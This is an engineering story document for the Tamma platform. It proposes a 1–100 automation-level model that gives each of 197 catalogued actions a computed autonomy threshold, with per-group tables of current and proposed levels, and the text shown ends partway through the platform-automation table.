# Story 43-11: The Automation-Level Model — 1–100, and a Level for Every Action

Status: drafted

## MANDATORY: Before You Code

**ALL contributors MUST read and follow the comprehensive development process:**

[BEFORE_YOU_CODE.md](../../../guides/BEFORE_YOU_CODE.md)

Then, before writing any code, check the knowledge base:

- `.dev/spikes/` — existing research
- `.dev/bugs/` — known bugs
- `.dev/findings/` — pitfalls and best practices
- `.dev/decisions/` — architecture decisions

## User Story

As a **platform operator turning the automation dial**,
I want the dial to span **1–100**, every catalogued action to carry the level at which it becomes automated, actions at or below the current level to be owned by the level (automated, greyed, not individually switchable), and actions above it to carry a per-action toggle,
So that **moving the dial actually changes what the system does by itself** — which, today, it does not for any of the 197 catalogued actions.

## Priority

P0 — This is the story that makes Epic 43's dial mean something. Epic 43 built the catalog (43-2/43-3), the storage and resolver (43-5), the admin API (43-6) and five enforcement seams (43-9); every one of them reads a threshold that is the *same number* for 193 of 197 actions. The machinery is complete and inert. Nothing else in the epic is worth shipping without this.

## Architectural Context (READ FIRST)

### 1. The dial is validated `[70,100]` and changes nothing across that whole range

- `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:27` — `public const int Min = 70;`
- `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:30` — `public const int Max = 100;`
- `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:41` — `IsValidLevel(level) => level >= Min && level <= Max` — a level of `50` or `10` is **not a legal dial position**, so no action can be assigned one.
- `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:38` — `public const int AlwaysHuman = Max + 1;` — `101`, a legal *stored threshold* meaning "a person at every level" (`:48`, `IsValidThreshold`).
- `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AcceptanceRules.cs:85-86` still enforces the bound as a **literal comparison** (`if (AutonomyLevel is < 70 or > 100)`) — Story 43-1's AC2 rewire has not landed.

**The catalog is 197 descriptors** (`ActionVocabularyCountTests.cs:132-149` — 96 agent-action + 17 document-type + 8 tool + 39 effect + 29 automation + 8 platform-task). **Exactly FOUR carry an explicit threshold**, and all four are `AlwaysHuman`:

| Action | Site |
|---|---|
| `document-type:design` | `ActionCatalog.Descriptors.cs:241` |
| `document-type:sprint-plan` | `ActionCatalog.Descriptors.cs:253` |
| `document-type:threat-model` | `ActionCatalog.Descriptors.cs:255` |
| `effect:mcp.tool.invoke` | `ActionCatalog.Descriptors.cs:388` |

The other **193** take a helper default of `AutonomyDial.Min` — six sites, three of which do not even expose the parameter: `ActionCatalog.Descriptors.cs:40` (`Agent`), `:45` (`Doc`), `:53` (`Tool`, hardcoded), `:58` (`Effect`), `:69` (`Automation`, hardcoded), `:75` (`Task`, hardcoded). It is pinned as an invariant by `ActionCatalogDefaultsTests.cs:83-91` (`EveryOtherMember_DefaultsToMin`).

**Therefore: moving the dial from 70 to 100 changes the automated set for 0 of 197 actions.** Every action is automated at 70; the four sentinels are automated at no level at all. There is no level in `[70,100]` at which the automated set differs from the level below it. That is the defect this story exists to fix.

### 2. Story 43-1 / epic D3 already promised this edit

`docs/stories/epic-43/README.md:549`, decision **D3**, verbatim:

> | **D3** | Model carries **no lower bound**; `[70,100]` stays as one named constant. | Widening now; keeping 70 permanently (which would make the greyed rows pointless) |

and `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:10-13`, verbatim:

> The model deliberately carries NO lower-bound-below-`Min` concept (no `AbsoluteMin`, no "widened range" flag): `[70,100]` is one named constant pair, and widening IS editing `Min`.

and `docs/stories/epic-43/story-43-1/43-1-autonomy-dial-one-constant.md:131`, Out of Scope:

> **Actually widening the range.** `Min` stays `70`. This story makes widening a one-line edit; it does not perform it. Widening is a product decision with a real consequence — every catalog row defaulted to `Min` becomes automated at a lower dial.

**Stated plainly: this story is that one-line edit (`AutonomyDial.cs:27`, `70` → `1`) plus the assignment work that the edit was pointless without.** 43-1's own rejected column names the alternative it feared — "keeping 70 permanently (which would make the greyed rows pointless)" — and that is where the tree is today.

### 3. The storage for the custom-toggle layer already exists — do not invent one

Story 43-5 shipped it. Read it before designing anything:

- `apps/tamma-elsa/src/Tamma.Data/Entities/ActionAssignment.cs:60-68` — `target_kind ∈ {action, group, mode}` + `target_key`.
- `ActionAssignment.cs:70-75` — `MinAutonomy` is nullable, and there is **no numeric DB CHECK** on it (43-5 AC3/D5, restated in the migration itself at `apps/tamma-elsa/src/Tamma.Data/Migrations/ControlPlane/20260729070256_AddActionGovernance.cs:32-33`). **Widening the dial therefore needs zero SQL.**
- `ActionAssignment.cs:52-58` — three principal scopes: platform (both keys null — the ceiling), tenant, user.
- `apps/tamma-elsa/src/Tamma.Core/Actions/AutonomyGateEvaluator.cs:11-17` — the resolution ladder: `max(platformCeiling, legacyAlwaysEscalateFloor, principalLadder)`, where the principal ladder is `action row → group row → shipped default` by `??` (an action row beats its group outright).
- `apps/tamma-elsa/src/Tamma.Api/Endpoints/ActionPolicyEndpoints.cs:187-200` — `PUT /api/actions/policy/actions/{ns}/{key}/threshold`, a single-field DTO.

A per-action toggle is **one `action`-scope row carrying `min_autonomy = <current dial>`**. Nothing new is required.

### 4. Four places where the tree contradicts the model as stated

| # | Site | Contradiction |
|---|---|---|
| 1 | `ActionPolicyEndpoints.cs:145-148` | `editable = true` **unconditionally**, with a comment citing epic decision S3: "*A row automated at the previewed level is still editable*". The model says the opposite: at or below the level, the level owns it. |
| 2 | `docs/stories/epic-43/story-43-7/43-7-admin-ui.md:115-117` + AC5 (`:146-149`) | The greyed-row contract states "**A greyed row's control stays visible and fully editable**" and pins it with `keeps_threshold_control_editable_on_greyed_row`. Same contradiction, in the UI story. |
| 3 | `ActionPolicyEndpoints.cs:600-625` (+ the group form at `:569-598`) | A **mid-range threshold is rejected** on any non-escalatable member — i.e. every one of the 29 `automation:*` actions may only be `Min` or `AlwaysHuman`. Under a 1–100 model those 29 cannot be given real levels at all. |
| 4 | `AcceptanceDefaults.cs:122,146,170` (`AcceptorRequirement.Human` for `design`, `sprint-plan`, `threat-model`) + `AcceptanceFloors.cs` | If the catalog puts `document-type:design` on a real level, the acceptance resolver still says a person accepts a design **at every level**. `ActionCatalogDefaultsTests.cs:93-120` (`DesignDocumentType_MatchesAcceptanceDefaults`) exists precisely to stop those two from disagreeing, and will fail. |

### 5. What actually enforces anything today

`ActionEnforcementSitesTests.cs:159-176` pins it as a number: **21 of 197 catalog rows are bound to a live site**, and the test's own comment demands the fact stay visible. Live enforcement is:

- **Seam B** — the tool loop (`Tamma.Activities/…/InlineToolLoopRunner.cs`), gating all 8 `tool:*` members. Live.
- **Seam C** — 16 routes carrying `.EnforcesGovernance()` in `apps/tamma-elsa/src/Tamma.Api/Program.cs` (`:3158,3165,3178,3182,3192` engine mediation; `:3403,3408,3413,3421,3438,3447,3455,3470,3484,3509,3520` app-level).
- **Seam D** — deny-only, **5 of 29** background actors opt in: `RevealTokenSweeper.cs:64`, `ChannelOutboxSweeper.cs:77`, `OutboxSlackSender.cs:133`, `TaskQueueProcessor.cs:94`, `OutboxSmtpSender.cs:153`.
- **Seam E** — the deploy pipeline's third `OR` term (`DeploymentPipelineWorkflow.cs:274`).
- **Seam A** — `POST /api/v1/llm/call` observes and never blocks, by construction.

This matters for the migration: a level change on a row with no site is **declarative**; a level change on one of these is a **behaviour change on a running deployment**.

---

## The Model

### M1 — The bands, and the rule that produces them

A level is not a taste. It is computed from four properties the catalog already carries, so any assignment can be argued with rather than merely disliked.

**Inputs**

| Input | Where it lives |
|---|---|
| `Risk` — `ReadOnly` \| `Mutating` \| `Command` \| `Destructive` | `apps/tamma-elsa/src/Tamma.Core/Actions/ActionRisk.cs:20-29` |
| `Reversible` | `apps/tamma-elsa/src/Tamma.Core/Actions/ActionDescriptor.cs:15` |
| `Group` — the kind of consequence at completion | `apps/tamma-elsa/src/Tamma.Core/Actions/ActionGroup.cs:41-87` |
| `SiteKey` — used only to split `issue-tracking` into native vs. external | `ActionDescriptor.cs:27-34` |

**Derived axis — CONTAINMENT: where does the consequence land, and who is affected?** Five classes, each a predicate over the inputs above:

| Class | Predicate | Meaning |
|---|---|---|
| **I1a** | anything not matched below | Inside the deployment; the output is prose, a housekeeping row, a workspace file, or Tamma's own record. Discardable. |
| **I1b** | `Group == authoring` | Inside the deployment, but the output is the **binding artifact** other work builds against. |
| **I1c** | `Group == review-and-acceptance` | Inside the deployment, but the output is a **verdict/acceptance** that lets work proceed. |
| **I2** | `Group ∈ {source-control-write, external-comms, command-execution, secrets}`; or `Group == issue-tracking` **and** `SiteKey` is a third-party route (`/api/v1/git/…`, `/api/v1/jira/…`); or `Group == model-invocation` **and** `Risk ∈ {Command, Destructive}`; or the action mints/tears third-party infrastructure (`platform-task:provisioning.tenant`, `…v2`, `billing.customer.create`, `RETIRE_SECRET_VERSION`, `automation:outbox-slack-sender`, `automation:outbox-smtp-sender`) | The consequence **leaves the deployment** — a third-party system, a person's inbox, or an unbounded reach (`shell_execute` "can reach any governed HTTP route by curl", `ActionGroup.cs:127-130`). |
| **I3** | `Group == deploy-control`; or the action destroys/relocates a whole tenant (`platform-task:provisioning.tenant.deprovision`, `platform-task:tenant.move`, `automation:tenant-cleanup-requested-trigger`, `automation:tenant-delete-requested-trigger`) | **Production or a tenant.** The only class whose blast radius is "everyone using the product". |

**The level table.** Containment picks the row; `Risk` + `Reversible` pick the column. (`Destructive` implies irreversible — pinned by `ActionDescriptorMetadataTests.cs:90-96`.)

| Containment | ReadOnly | Mutating + reversible | Mutating + irreversible | Command | Destructive |
|---|---|---|---|---|---|
| **I1a** contained, discardable | 10 | 30 | 45 | 50 | 75 |
| **I1b** contained, binding | 10 | 45 | 55 | 55 | 75 |
| **I1c** contained, releasing | 10 | 55 | 60 | 60 | 75 |
| **I2** leaves the deployment | 20 | 65 | 75 | 80 | 90 |
| **I3** production / tenant | 20 | 80 | 90 | 90 | 95 |

**Two overrides, each derived from a property the catalog already reads — not from taste:**

- **O1 — panel acceptance.** A `document-type:*` whose `AcceptanceDefaults.For` returns the 7-role majority panel (`AcceptanceDefaults.cs:212-213`: `plan`, `review`, `acceptance-criteria`, `ux-spec`) sits at **60**, not 55: the shipped default already says one reviewer is not enough.
- **O2 — human acceptor today.** The three types whose `AcceptanceDefaults.For` returns an `AcceptorRequirement.Human` row (`AcceptanceDefaults.cs:122,146,170`) sit above the panel band: `design` **80**, `sprint-plan` **85**, `threat-model` **90**. The *ordering* among the three is a product judgement — see Open Questions **OQ4**.

**The bands the table produces**, with counts over the 197:

| Band | Name | What sits there | Count |
|---|---|---|---|
| **1–20** | **Observation** | Nothing changes. Reads, triage, analysis, audits. | **47** |
| **21–40** | **Contained, reversible writes** | Prose, housekeeping rows, workspace files, Tamma's own tracker record. Undone by an edit. | **52** |
| **41–60** | **Binding work, executions and decisions** | Code and designs others build against; test runs; review verdicts and document acceptances. Still inside the deployment, but other work now depends on it. | **60** |
| **61–80** | **Effects that leave the deployment** | Branches, PRs, releases, tracker/Jira writes, agent dispatch, MCP, shell. Someone outside can see it. | **27** |
| **81–95** | **Irreversible destruction, outside or in production** | Branch deletion, cancelled runs, production promotion and rollback, tenant teardown. | **11** |
| **96–100** | **Reserved — deliberately empty** | Nothing is assigned here, which is what makes "at 100 everything is automated" true **by construction** rather than by hope. | **0** |

At level 1 nothing is automated (the lowest assigned level is 10); at 100 everything is. The dial monotonically automates more in between, and the automated set strictly grows at 10, 20, 30, 45, 50, 55, 60, 65, 75, 80, 85, 90 and 95 — thirteen levels at which the dial visibly does something.

### M2 — A level for every action

Grouped by `ActionGroup` (`ActionGroup.cs:41-87`), sorted by proposed level. **Now** is the shipped `DefaultMinAutonomy` today. Levels **above 70** are bolded — those are the behaviour changes, enumerated again in M5.

#### `planning-and-analysis` — 37 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:analyze-assessment-response` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:analyze-security-incident` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:assess-capacity` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:assess-technical-risk` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:assess-vulnerability` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:audit-accessibility` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:audit-dependencies` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:clarify-requirements` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:context-scan` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:coordinate-release` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:create-tasks` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:debug-rootcause` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:decompose-issue` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:define-acceptance-criteria` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:diagnose-incident` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:facilitate-retro` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:generate-assessment-questions` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:incident-rootcause` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:manage-regression` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:monitor-health` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:plan-debugging` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:plan-incident-response` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:plan-roadmap` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:plan-scope` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:plan-test-strategy` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:prioritize-backlog` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:research` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:resolve-blocker` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:score-ambiguity` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:threat-model` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:track-impediments` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-context-scan` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-defect` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-intake` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-pr` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-tech-debt` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `agent-action:triage-technical` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |

#### `authoring` — 23 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:address-review-comments` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:author-ui-spec` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:debug` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:design-api-contract` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:design-data-model` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:design-integration` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:design-system` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:draft-user-flow` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:implement-feature` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:implement-fix` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:implement-infrastructure` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:incorporate-answers` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-fix` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-implementation` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-migration-strategy` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-refactor` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-sprint` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:plan-system-design` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:propose-design` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:refactor` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:write-regression-test` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:write-test-cases` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |
| `agent-action:write-tests` | 70 | 45 | I1b · MutRev — produces the binding artifact other work builds against |

#### `review-and-acceptance` — 34 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:code-review` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:code-review-architecture` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:code-review-coverage` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:code-review-security` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:mentor-feedback` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:plan-review` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:plan-review-security` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-acceptance` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-compliance` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-design` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-docs` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-feasibility` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-operability` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-scope` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:review-testability` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:self-review` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `agent-action:verify-acceptance` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:ambiguity-assessment` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:backlog-ordering` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:clarification` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:decomposition` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:diagnosis` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:findings` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:prose` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:test-plan` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:test-spec` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:triage-decision` | 70 | 55 | I1c · MutRev — a verdict/acceptance that lets work proceed |
| `document-type:acceptance-criteria` | 70 | 60 | I1c · MutRev — accepted by the 7-role majority panel (`AcceptanceDefaults.For`), not one reviewer |
| `document-type:plan` | 70 | 60 | I1c · MutRev — accepted by the 7-role majority panel (`AcceptanceDefaults.For`), not one reviewer |
| `document-type:review` | 70 | 60 | I1c · MutRev — accepted by the 7-role majority panel (`AcceptanceDefaults.For`), not one reviewer |
| `document-type:ux-spec` | 70 | 60 | I1c · MutRev — accepted by the 7-role majority panel (`AcceptanceDefaults.For`), not one reviewer |
| `document-type:design` | **101** | **80** | I1c · MutRev — ships `AcceptorRequirement.Human` today (`AcceptanceDefaults.cs`) — the only three that do |
| `document-type:sprint-plan` | **101** | **85** | I1c · MutRev — ships `AcceptorRequirement.Human` today (`AcceptanceDefaults.cs`) — the only three that do |
| `document-type:threat-model` | **101** | **90** | I1c · MutRev — ships `AcceptorRequirement.Human` today (`AcceptanceDefaults.cs`) — the only three that do |

#### `docs` — 13 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:report-status` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:summarize-changes` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:summarize-stakeholder` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:summarize-technical` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:synthesize-standup` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:update-changelog` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-adr` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-api-docs` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-postmortem` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-release-notes` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-retro-narrative` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-runbook` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `agent-action:write-user-docs` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |

#### `code-read` — 3 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `tool:file_read` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `tool:get_acceptance_rules` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `tool:search_code` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |

#### `code-write` — 1 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `tool:file_write` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |

#### `command-execution` — 2 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `effect:process.spawn` | 70 | **80** | I2 · Command — executes with unbounded reach outside the deployment |
| `tool:shell_execute` | 70 | **80** | I2 · Command — executes with unbounded reach outside the deployment |

#### `ci-and-test` — 3 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:exploratory-test` | 70 | 50 | I1a · Command — executes inside the deployment |
| `effect:ci.tests.trigger` | 70 | 50 | I1a · Command — executes inside the deployment |
| `tool:run_tests` | 70 | 50 | I1a · Command — executes inside the deployment |

#### `source-control-read` — 1 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `tool:git_operations.read` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |

#### `source-control-write` — 6 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `effect:git.branch.create` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `effect:git.pull-request.create` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `effect:git.release.create` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `tool:git_operations.write` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `effect:git.pull-request.merge` | 70 | **75** | I2 · MutIrrev — the effect leaves the deployment and cannot be recalled |
| `effect:git.branch.delete` | 70 | **90** | I2 · Destructive — destroys something outside the deployment |

#### `issue-tracking` — 12 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `effect:tracker.preferences.delete` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.preferences.set` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.project.create` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.project.update` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.work-item.assign` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.work-item.create` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.work-item.set-status` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:tracker.work-item.update` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:git.issue.patch` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `effect:jira.ticket.patch` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `effect:tracker.project.delete` | 70 | **75** | I1a · Destructive — destroys work inside the deployment |
| `effect:tracker.work-item.delete` | 70 | **75** | I1a · Destructive — destroys work inside the deployment |

#### `deploy-control` — 6 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:plan-deployment` | 70 | 20 | I3 · ReadOnly — analysis about production; changes nothing |
| `agent-action:configure-cicd` | 70 | **80** | I3 · MutRev — changes production/tenant configuration; re-settable |
| `agent-action:deploy` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |
| `agent-action:rollback` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |
| `effect:deploy.promote-prod` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |
| `effect:deploy.rollback` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |

#### `external-comms` — 2 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `effect:notify.email.send` | 70 | **75** | I2 · MutIrrev — the effect leaves the deployment and cannot be recalled |
| `effect:notify.slack.queue` | 70 | **75** | I2 · MutIrrev — the effect leaves the deployment and cannot be recalled |

#### `model-invocation` — 7 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `effect:mentorship.session.pause` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:mentorship.session.resume` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:llm.call` | 70 | 45 | I1a · MutIrrev — writes inside the deployment and cannot be un-written |
| `effect:agent-dispatch.run` | 70 | **80** | I2 · Command — executes with unbounded reach outside the deployment |
| `effect:mcp.tool.invoke` | **101** | **80** | I2 · Command — executes with unbounded reach outside the deployment |
| `effect:mentorship.session.start` | 70 | **80** | I2 · Command — executes with unbounded reach outside the deployment |
| `effect:mentorship.session.cancel` | 70 | **90** | I2 · Destructive — destroys something outside the deployment |

#### `secrets` — 4 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `agent-action:audit-secrets` | 70 | 20 | I2 · ReadOnly — reads material that is not the deployment's own |
| `effect:secret.reveal` | 70 | 20 | I2 · ReadOnly — reads material that is not the deployment's own |
| `automation:retire-sweep` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `automation:secret-auto-rotation-scheduler` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |

#### `platform-automation` — 43 actions

| Action key | Now | Level | Why |
|---|---|---|---|
| `automation:action-catalog-startup-validator` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `automation:governance-policy-snapshot-priming-service` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `automation:provider-settings-store-priming-service` | 70 | 10 | I1a · ReadOnly — observes only; nothing changes |
| `automation:agent-seeder` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:alert-rule-evaluator` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:audit-chain-checkpoint-scheduler` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:audit-projector` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:built-in-alert-rule-seeder` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:channel-outbox-sweeper` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:convention-store-seeder` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:engine-registry-heartbeat-service` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:entitlement-cache-invalidation-listener` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:hourly-analytics-rollup-scheduler` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:notification-dispatcher` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:platform-task-worker` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:pool-warmup-service` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:provider-session-cleanup-service` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:reveal-token-sweeper` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:task-queue-processor` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
